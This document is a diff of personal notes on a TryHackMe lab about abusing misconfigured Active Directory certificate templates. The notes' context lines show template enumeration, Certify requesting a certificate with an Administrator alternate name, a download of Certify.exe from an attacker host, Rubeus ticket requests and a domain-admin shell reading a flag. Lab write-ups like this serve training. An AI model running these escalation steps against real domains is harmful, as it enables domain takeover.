@@ -29,7 +29,6 @@ Read the above
 
  Completed
 
-
 ### A brief look at certificate templates
 
 Windows Active Directory (AD) is not just for identity and access management but provides a significant amount of services to help you run and manage your organisation. A lot of these services are less commonly known or used, meaning they are often overlooked when security hardening is performed. One of these services is the Active Directory Certificate Services (AD CS).
@@ -66,7 +65,6 @@ What does the user create to ask the CA for a certificate?
 What is the name of Microsoft's PKI implementation?
 
 *Active Directory Certificate Services*
-
 
 ### Certificate template enumeration
 
@@ -199,7 +197,6 @@ Name: Active Directory Enrollment Policy
     Allow Full Control	LUNAR\Enterprise Admins
     Allow Read	NT AUTHORITY\Authenticated Users
 
-
   TemplatePropExtensions =
 3 Extensions:
 
@@ -270,7 +267,6 @@ Name: Active Directory Enrollment Policy
     Allow Full Control	LUNAR\Domain Admins
     Allow Full Control	LUNAR\Enterprise Admins
     Allow Read	NT AUTHORITY\Authenticated Users
-
 
   TemplatePropExtensions =
 3 Extensions:
@@ -345,7 +341,6 @@ Local Group Memberships      *Backup Operators     *Remote Desktop Users
 Global Group memberships     *Domain Users
 The command completed successfully.
 
-
 Template[31]:
   TemplatePropCommonName = UserRequest
   TemplatePropFriendlyName = User Request
@@ -407,7 +402,6 @@ Template[31]:
     Allow Full Control	LUNAR\Administrator
     Allow Read	NT AUTHORITY\Authenticated Users
 
-
   TemplatePropExtensions =
 4 Extensions:
 
@@ -449,16 +443,13 @@ What AD group will allow all AD user accounts to request a certificate?
 
 *Domain Users*
 
-
 What AD group will allow all domain-joined computers to request a certificate?  
 
 *Domain Computers*
 
-
 Which EKU allows us to use the generated certificate for Kerberos authentication?  
 
 *Client Authentication*
-
 
 Which certificate template is misconfigured based on the three provided parameters?
 
@@ -544,10 +535,6 @@ Answer the questions below
 
 ```
 
-![[Pasted image 20230216162756.png]]
-![[Pasted image 20230216164950.png]]
-![[Pasted image 20230216165250.png]]
-
 In which field do we inject the User Principal Name of the account we want to impersonate?  
 
 Called SAN for short
@@ -563,7 +550,6 @@ You make this selection when prompted: "This snap-in will always manage certific
 Follow the steps above and generate your very own privilege escalation certificate  
 
  Completed
-
 
 ### User impersonation through a certificate
 
@@ -754,7 +740,6 @@ C:\THMTools>.\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:C:
 
 [*] Ticket written to svc.gitlab.kirbi
 
-
   ServiceName              :  krbtgt/lunar.eruca.com
   ServiceRealm             :  LUNAR.ERUCA.COM
   UserName                 :  svc.gitlab
@@ -829,7 +814,6 @@ Local Group Memberships
 Global Group memberships     *Domain Admins        *Domain Users
 The command completed successfully.
 
-
 C:\Windows\system32>cd C:\Users\Administrator
 
 C:\Users\Administrator>cd Desktop
@@ -850,8 +834,6 @@ C:\Users\Administrator\Desktop>type flag.txt
 THM{AD.Certs.Can.Get.You.DA}
 
 ```
-
-![[Pasted image 20230216170432.png]]
 
 What is the value of the flag stored on the Administrator's Desktop?
 
@@ -907,7 +889,6 @@ Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
 PS C:\THMTools> iwr http://10.8.19.103:1337/Certify.exe -outfile C:\THMTools\Certify.exe
-
 
 PS C:\THMTools> .\Certify.exe find /vulnerable
 
@@ -1005,15 +986,12 @@ PS C:\THMTools> .\Certify.exe find /vulnerable
                                       LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
                                       LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
 
-
-
 Certify completed in 00:00:15.8021412
 
 [!] Vulnerable Certificates Templates :
 
     CA Name                               : LUNDC.lunar.eruca.com\lunar-LUNDC-CA
     Template Name                         : UserRequest
-
 
 PS C:\THMTools> .\Certify.exe request /ca:LUNDC.lunar.eruca.com\lunar-LUNDC-CA /template:UserRequest /altname:Administrator
 
@@ -1108,10 +1086,7 @@ UbYNA0LowCkE/U//2kFX4PtY/hGgCjD1gLC3NohW6NVjqGzWtrXfUm1kxQeqia9w
 zA==
 -----END CERTIFICATE-----
 
-
 [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-
-
 
 Certify completed in 00:00:18.8281522
 
@@ -1318,7 +1293,5 @@ lunar\administrator
 
 Was really fun!
 ```
-
-
 
 [[CVE-2022-26923]]
